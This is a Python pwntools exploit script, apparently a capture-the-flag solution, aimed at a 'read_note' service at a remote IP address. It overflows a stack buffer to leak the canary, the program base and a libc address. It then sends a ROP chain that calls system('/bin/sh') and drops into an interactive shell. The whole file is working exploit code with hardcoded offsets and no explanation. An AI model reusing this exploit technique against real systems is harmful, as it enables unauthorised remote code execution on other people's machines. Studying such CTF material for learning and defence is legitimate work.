from pwn import *

#context.log_level="debug"

r = remote("114.116.54.89", 10000)
#r = process("./read_note")


def denglu():
    r.recvuntil("Please input the note path:\n")
    r.sendline("flag")
    r.recvuntil("please input the note len:\n")
    r.sendline("1000")
    r.recvuntil("please input the note:\n")


denglu()
payload = 'A' * (0x260 - 8) + 'B'
r.send(payload)
r.recvuntil("AB")
canary = u64(r.recv(7).rjust(8, '\x00'))
print hex(canary)
r.recvuntil("  so please input note(len is 624)\n")
payload = 'A' * (0x260 - 8) + p64(canary) + p64(0) + '\x20'
r.send(payload)
print ("1")


denglu()
payload = 'A' * (0x260 + 7) + 'B'
r.send(payload)
r.recvuntil("AB")
x = r.recvline()
vul_ret = u64(x[:-1].ljust(8, '\x00'))
add = vul_ret - 0xD2E
r.recvuntil("  so please input note(len is 624)\n")
payload = 'A' * (0x260 - 8) + p64(canary) + p64(0) + '\x20'
r.send(payload)
print("2")
start = 0xD20 + add
pop_rdi = 0x0e03 + add


denglu()
payload = 'A' * (0x260 + 8 * 5 - 1) + 'B'
r.send(payload)
r.recvuntil("AB")
x = r.recvuntil("len must be")
lib_main_ret = u64(x[:8].split("\n")[0].ljust(8, "\x00"))

lib = lib_main_ret - 0x20830
sys = lib + 0x045390
binsh = lib + 0x018CD57

r.recvuntil("  so please input note(len is 624)\n")
payload = 'A' * (0x260 - 8) + p64(canary) + p64(0) + p64(start)
r.send(payload)
print ("3")


denglu()
payload = 'A' * (0x260 - 8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(binsh) + p64(sys)
r.send(payload)
#r.send('AA')
r.recvuntil("(len is 624)\n")
r.sendline('a')

#payload = 'A' * (0x260 - 8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(binsh) + p64(sys)
print("4")
r.interactive()

